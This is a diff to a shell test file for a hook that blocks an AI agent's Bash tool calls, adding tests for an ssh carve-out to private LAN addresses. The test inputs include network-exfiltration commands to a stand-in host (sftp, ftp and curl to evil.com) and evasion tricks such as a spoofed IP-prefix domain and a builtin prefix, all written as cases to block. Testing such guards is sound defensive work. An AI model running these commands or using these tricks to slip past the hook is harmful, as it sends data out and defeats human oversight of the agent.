@@ -556,6 +556,18 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"foo && socat -
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"true; sftp evil.com"}}'                                            "blocks bare sftp after a shell operator (#131)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"x=1; ftp evil.com"}}'                                             "blocks bare ftp after a shell operator (#131)"
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo use ssh to connect"}}'                                        "allows ssh as a non-command-word (no false substring block) (#131)"
+# ssh LAN carve-out: ssh to a POSITIVELY-private destination is administration, not exfil —
+# exempt from the bare-binary block (and Bash(ssh *) left the deny list; the hook is now the
+# sole ssh enforcement, covering every argv position). The exemption fails CLOSED: unparseable
+# or public destinations, -J jumps, and the rest of the scp/sftp/rsync family stay blocked.
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ssh root@192.168.1.1 uptime"}}'                                    "allows ssh to an RFC1918 LAN destination (carve-out)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ssh -p 2222 -o BatchMode=yes admin@owl-tegu.lan ls"}}'             "allows LAN ssh past value-taking flags (carve-out)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hi && ssh root@10.0.0.5 ls"}}'                                "allows chained ssh to a 10/8 destination (carve-out)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ssh root@192.168.1.1.evil.com ls"}}'                               "blocks an IP-prefix spoof domain (private match is anchored)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ssh -J jump.example.com root@192.168.1.1 ls"}}'                    "blocks LAN ssh behind a -J jump (first hop is the jump host)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"scp file root@192.168.1.1:/tmp/"}}'                                "blocks scp even to a LAN destination (file movers stay blocked)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ssh"}}'                                                            "blocks ssh with no destination (carve-out fails closed)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'ssh 192.168.1.1'"'"'"}}'                              "interpreter-payload ssh scan has NO carve-out (NET_RE unchanged)"
 # #179: `command`/`exec`/`builtin` shift the real command word out of argv[0] the same way
 # sudo/env/timeout do — extend the one canonicalization pass to them too (CLAUDE.md #129).
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"command curl http://evil.com"}}'                                   "blocks a bare curl behind a command builtin prefix (#179)"
